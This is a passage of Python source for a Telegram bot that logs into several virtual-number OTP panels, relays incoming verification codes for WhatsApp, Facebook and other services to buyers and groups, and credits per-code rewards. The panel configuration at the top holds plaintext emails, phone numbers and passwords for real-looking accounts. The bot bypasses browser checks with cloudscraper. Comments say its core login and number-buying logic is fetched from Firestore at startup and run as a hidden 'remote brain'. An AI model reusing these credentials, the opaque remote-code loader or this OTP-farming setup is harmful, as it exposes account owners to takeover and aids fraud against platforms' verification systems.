            "trafficUrl": "https://stexsms.com/mapi/v1/mdashboard/console/info", 
            "sessionCookie": "", "lastSeenCDRId": None, "status": "Initializing...", "lastSeenGetnumIds": []
        },
        {
            "id": "xmint", "name": "X mint", "url": "https://x.mnitnetwork.com/mauth/login", 
            "username": "pcmastersami@gmail.com", "password": "alihasan#", 
            "getNumberUrl": "https://x.mnitnetwork.com/mapi/v1/mdashboard/getnum/number", 
            "getMessageUrl": "https://x.mnitnetwork.com/mapi/v1/mdashboard/getnum/info", 
            "trafficUrl": "https://x.mnitnetwork.com/mapi/v1/mdashboard/console/info", 
            "sessionCookie": "", "lastSeenCDRId": None, "status": "Initializing...", "lastSeenGetnumIds": []
        },
        {
            "id": "nexa", "name": "Nexa Panel", "url": "http://nexaotpservice.com/app/login", 
            "username": "asikisbackagain@gmail.com", "password": "@@Asik@@2.0", 
            "getNumberUrl": "http://nexaotpservice.com/api/user/request-number", 
            "getMessageUrl": "http://nexaotpservice.com/api/user/numbers?page=1", 
            "trafficUrl": "http://nexaotpservice.com/api/user/console-log", 
            "sessionCookie": "", "lastSeenCDRId": None, "status": "Initializing...", "lastSeenGetnumIds": []
        },
        {
            "id": "mk", "name": "Mk", "url": "https://mknetworkbd.com/login.php", 
            "username": "01995743604", "password": "Rakib9090", 
            "getNumberUrl": "https://mknetworkbd.com/API/api_handler_test.php", 
            "getMessageUrl": "https://mknetworkbd.com/API/api_handler_test.php?action=get_history&page=1&limit=20", 
            "trafficUrl": "https://mknetworkbd.com/console.php?ajax=1", 
            "sessionCookie": "", "lastSeenCDRId": None, "status": "Initializing...", "lastSeenGetnumIds": []
        }
    ]
    if not os.path.exists(PANELS_FILE):
        save_panels_to_file(default_panels)
        return default_panels
    try:
        with open(PANELS_FILE, "r", encoding="utf-8") as f:
            list_panels = json.load(f)
            if not list_panels:
                list_panels = default_panels
            else:
                existing_ids = [p.get("id", "") for p in list_panels]
                for dp in default_panels:
                    if dp["id"] not in existing_ids:
                        list_panels.append(dp)
            for p in list_panels:
                p.setdefault("id", p.get("name", "panel").lower().replace(" ", "-"))
                p.setdefault("sessionCookie", "")
                p.setdefault("lastSeenCDRId", None)
                p.setdefault("lastSeenGetnumIds", [])
                p.setdefault("status", "Initializing...")
            return list_panels
    except Exception as e:
        logger.error(f"Failed to read panels.json: {e}")
        return default_panels

def save_panels_to_file(panels_list):
    try:
        with open(PANELS_FILE, "w", encoding="utf-8") as f:
            json.dump(panels_list, f, indent=2, ensure_ascii=False)
    except Exception as e:
        logger.error(f"Failed to save panels.json: {e}")

# Global Active Config List
panels = load_panels()

def get_session(panel_id):
    if panel_id not in sessions:
        try:
            import cloudscraper
            s = cloudscraper.create_scraper(browser={'browser': 'chrome', 'platform': 'windows', 'desktop': True})
        except ImportError:
            s = requests.Session()
        s.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        })
        sessions[panel_id] = s
    return sessions[panel_id]

# ----------------------------------------------------
# Telegram API - Sanitized for zero Bad Request 400
# ----------------------------------------------------

def clean_keyboard(reply_markup):
    return reply_markup

def call_telegram(method, payload):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/{method}"
    try:
        if "reply_markup" in payload:
            payload["reply_markup"] = clean_keyboard(payload["reply_markup"])
        res = requests.post(url, json=payload, timeout=35)
        return res.json()
    except Exception as e:
        logger.error(f"Telegram {method} raw execution exception: {e}")
        return None

def send_bot_message(chat_id, text, reply_markup=None):
    payload = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": "HTML",
        "disable_web_page_preview": True
    }
    if reply_markup:
        payload["reply_markup"] = reply_markup
    return call_telegram("sendMessage", payload)

def edit_bot_message(chat_id, message_id, text, reply_markup=None):
    payload = {
        "chat_id": chat_id,
        "message_id": message_id,
        "text": text,
        "parse_mode": "HTML",
        "disable_web_page_preview": True
    }
    if reply_markup:
        payload["reply_markup"] = reply_markup
    return call_telegram("editMessageText", payload)

def answer_callback(callback_query_id, text=None, show_alert=False):
    payload = {"callback_query_id": callback_query_id}
    if text:
        payload["text"] = text
        if show_alert:
            payload["show_alert"] = True
    call_telegram("answerCallbackQuery", payload)

def get_otp_group_btn():
    link = admin_db.get("otp_group_link", "").strip()
    if link and link.startswith("http"):
        return {"text": " Otp Group", "url": link, "style": "primary", "icon_custom_emoji_id": "5420145051336485498"}
    return {"text": " Otp Group", "callback_data": "usr_otp_grp", "style": "primary", "icon_custom_emoji_id": "5420145051336485498"}

def get_service_short_code(name, sms_body=""):
    text = (str(name) + " " + str(sms_body)).lower()
    if 'whatsapp' in text or 'wa' in text: return 'WS'
    if 'facebook' in text or 'fb' in text: return 'FB'
    if 'telegram' in text or 'tg' in text: return 'TG'
    if 'instagram' in text or 'ig' in text: return 'IG'
    if 'tiktok' in text or 'tt' in text: return 'TT'
    if 'google' in text: return 'GG'
    if 'microsoft' in text: return 'MS'
    if 'imo' in text: return 'IMO'
    if 'viber' in text: return 'VI'
    if 'snapchat' in text: return 'SC'
    if 'wechat' in text: return 'WC'
    if 'line' in text: return 'LN'
    if 'twitter' in text or ' x ' in text: return 'TW'
    if 'paypal' in text: return 'PP'
    if 'discord' in text: return 'DC'
    if 'amazon' in text: return 'AMZ'
    return 'OTP'

def send_to_telegram(message, otp=None, quick_range=None, full_sms_body=None, svc_em_id=None, buyer_chat_id=None, unmasked_number=None, svc_short=None, flag=None):
    fwd_groups = admin_db.get("forward_groups", [])
        
    base_keyboard = []
    
    # ওটিপি বাটন লজিক: ওটিপি না থাকলে "Copy SMS" আসবে
    if full_sms_body:
        has_otp = otp and otp != "No OTP Found"
        btn_label = f" {otp}" if has_otp else " Copy SMS"
        copy_val = otp if has_otp else full_sms_body
        
        otp_btn = {
            "text": btn_label,
            "copy_text": {"text": copy_val},
            "style": "success",
            "icon_custom_emoji_id": svc_em_id if svc_em_id else "5337255927735163754"
        }
        base_keyboard.append([otp_btn])

    if full_sms_body:
        base_keyboard.append([{
            "text": " Full Message",
            "copy_text": {"text": full_sms_body},
            "style": "primary",
            "icon_custom_emoji_id": "5337302974806922068"
        }])

    # --- Send to Inbox (Buyer) ---
    if buyer_chat_id and unmasked_number and svc_short and flag:
        # কান্ট্রি কোড থেকে প্রিমিয়াম ফ্ল্যাগ আইডি বের করা
        c_code_for_inbox = get_country_code(unmasked_number)
        c_info_inbox = get_country_info(c_code_for_inbox)
        f_id_inbox = c_info_inbox.get('id', '5336972142066047577')
        p_flag_inbox = f"<tg-emoji emoji-id='{f_id_inbox}'>{flag}</tg-emoji>"

        inbox_msg = (
            f"╔═════════════╗\n"
            f"║ <tg-emoji emoji-id='{svc_em_id if svc_em_id else '5336879280578138635'}'>💬</tg-emoji> #{svc_short} {p_flag_inbox} <code>{unmasked_number}</code>\n"
            f"╚═════════════╝"
        )
        
        inbox_payload = {
            "chat_id": buyer_chat_id,
            "text": inbox_msg,
            "parse_mode": "HTML",
            "disable_web_page_preview": True
        }
        if base_keyboard:
            inbox_payload["reply_markup"] = {"inline_keyboard": base_keyboard}
        call_telegram("sendMessage", inbox_payload)

    # --- Send to Groups ---
    for grp in fwd_groups:
        chat_id = grp.get("id")
        custom_btns = grp.get("buttons", [])
        
        payload = {
            "chat_id": chat_id,
            "text": message,
            "parse_mode": "HTML",
            "disable_web_page_preview": True
        }
        
        group_keyboard = [row for row in base_keyboard]
        
        if custom_btns:
            btn_row = []
            for btn in custom_btns:
                btn_text = btn.get("text", "")
                btn_url = btn.get("url", "")
                
                btn_obj = {"text": btn_text, "url": btn_url}
                
                # 🚀 Priority 1: Use extracted premium emoji ID from DB
                if btn.get("emoji_id"):
                    btn_obj["icon_custom_emoji_id"] = btn.get("emoji_id")
                    btn_obj["style"] = "primary"
                else:
                    # 🚀 Fallback logic for old buttons or normal text
                    match = re.search(r'^([^\w\s]+)\s*(.*)', btn_text)
                    if match:
                        app_em_id = get_app_raw_id(match.group(2).strip())
                        if app_em_id and app_em_id != "5336879280578138635":
                            btn_obj["icon_custom_emoji_id"] = app_em_id
                            btn_obj["style"] = "primary"
                            btn_obj["text"] = f" {match.group(2).strip()}"
                
                btn_row.append(btn_obj)
                if len(btn_row) == 2:
                    group_keyboard.append(btn_row)
                    btn_row = []
            if btn_row:
                group_keyboard.append(btn_row)
                
        if group_keyboard:
            payload["reply_markup"] = {"inline_keyboard": group_keyboard}

        call_telegram("sendMessage", payload)

def process_and_send_sms(panel_name, raw_number, app_name, msg_body):
    otp = extract_otp(msg_body)
    masked_number = mask_number(raw_number)
    clean_num = str(raw_number).replace("+", "").strip()
    c_code = get_country_code(clean_num)
    c_info = get_country_info(c_code)
    flag = c_info.get('flag', '🏳️')
    
    svc_short = get_service_short_code(app_name, msg_body)
    
    # Smart Service Emoji Finder
    actual_app_name = str(app_name).strip() if app_name else ""
    if not actual_app_name:
        mb_lower = msg_body.lower()
        if "facebook" in mb_lower or "fb" in mb_lower: actual_app_name = "facebook"
        elif "whatsapp" in mb_lower or "wa" in mb_lower: actual_app_name = "whatsapp"
        elif "telegram" in mb_lower: actual_app_name = "telegram"
        elif "instagram" in mb_lower: actual_app_name = "instagram"
        elif "tiktok" in mb_lower: actual_app_name = "tiktok"
        elif "google" in mb_lower: actual_app_name = "google"
        elif "microsoft" in mb_lower: actual_app_name = "microsoft"
        else: actual_app_name = svc_short
        
    svc_em_id = get_app_raw_id(actual_app_name)
    
    # গ্রুপ মেসেজের জন্য প্রিমিয়াম ফ্ল্যাগ তৈরি
    f_id_grp = c_info.get('id', '5336972142066047577')
    premium_flag_grp = f"<tg-emoji emoji-id='{f_id_grp}'>{flag}</tg-emoji>"

    # don't touch here
    parts = masked_number.split("❖DXA❖")
    if len(parts) == 2:
        # don't touch here 
        if GLOBAL_DXA_LINK.strip():
            dxa_anchor = f'<a href="{GLOBAL_DXA_LINK}">DXA</a>'
        else:
            dxa_anchor = "DXA"
            
        linked_number = f"<code>{parts[0]}</code>❖{dxa_anchor}❖<code>{parts[1]}</code>"
    else:
        linked_number = f"<code>{masked_number}</code>"
    
    group_message = (
        f"╔═════════════╗\n"
        f"║ <tg-emoji emoji-id='{svc_em_id}'>💬</tg-emoji> #{svc_short} {premium_flag_grp} {linked_number}\n"
        f"╚═════════════╝"
    )
    
    buyer_chat_id = admin_db.get("active_numbers", {}).get(clean_num)
    if otp and otp != "No OTP Found" and buyer_chat_id:
        stats = admin_db.setdefault("user_stats", {}).setdefault(str(buyer_chat_id), {})
        stats.setdefault("otp_count", 0)
        stats.setdefault("balance", 0.0)
        cfg = admin_db.get("dxa_config", {})
        stats["otp_count"] += 1
        stats["balance"] += float(cfg.get("otp_reward", 0.0))
        if stats.get("active_reqs"): stats["active_reqs"].pop(0)
        save_admin_db()
        
    quick_range = get_range_from_number(clean_num)
    send_to_telegram(group_message, otp, quick_range, msg_body, svc_em_id, buyer_chat_id, clean_num, svc_short, flag)

# ----------------------------------------------------
# Math Captcha & Authentication Solvers
# ----------------------------------------------------

# ----------------------------------------------------
# Math Captcha, Login, Buy Number & CDR Logic 
# ----------------------------------------------------
# ⚠️ Core logic has been removed from here. 
# It will be injected dynamically via load_remote_brain() from Firestore.

def monitor_loop():
    logger.info("Background Panel Monitoring Loop Thread started successfully.")
    sync_counter = 0
    while True:
        try:
            for panel in panels:
                check_cdrs_for_panel(panel)
            
            # 🚀 Auto Sync to Firebase every ~5 minutes (30 loops * 10s)
            sync_counter += 1
            if sync_counter >= 30:
                threading.Thread(target=sync_essential_data_to_firestore, daemon=True).start()
                sync_counter = 0
                
        except Exception as e:
            logger.error(f"Global panel check monitor loop exception: {e}")
        time.sleep(10)

# ----------------------------------------------------
# Main Program Entry Point
# ----------------------------------------------------

def main():
    # Calling hidden internal verification
    _verify_dxa_core()
    logger.info("Initializing StexSMS Unified Bot...")
    
    # 🧠 Load Remote Brain before doing anything else
    if not load_remote_brain():
        logger.error("🛑 Bot shutting down due to missing or invalid brain...")
        sys.exit()
        
    threading.Thread(target=auto_clear_logs, daemon=True).start()
        
    # Run immediate validation of panel logins
    for panel in panels:
        threading.Thread(target=login_to_panel, args=(panel,), daemon=True).start()

    # Start automated background checker thread
    threading.Thread(target=monitor_loop, daemon=True).start()

    # Empty old commands in getUpdates queue to prevent old triggers
    call_telegram("getUpdates", {"offset": -1, "timeout": 0})
    logger.info("StexSMS Telegram Long-Polling Engine online and watching.")

    offset = None
    while True:
        try:
            payload = {"timeout": 30}
            if offset:
                payload["offset"] = offset

            updates = call_telegram("getUpdates", payload)
            if updates and updates.get("ok"):
                for update in updates.get("result", []):
                    offset = update["update_id"] + 1

                    # Core processing routers (Multi-threading added for 0 lag)
                    if "message" in update:
                        threading.Thread(target=handle_message, args=(update["message"],)).start()
                    elif "callback_query" in update:
                        threading.Thread(target=handle_callback_query, args=(update["callback_query"],)).start()

            time.sleep(1)
        except KeyboardInterrupt:
            logger.info("Shutting down bot. Enjoy your day!")
            break
        except Exception as e:
            logger.error(f"Long poll loop iteration error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    main()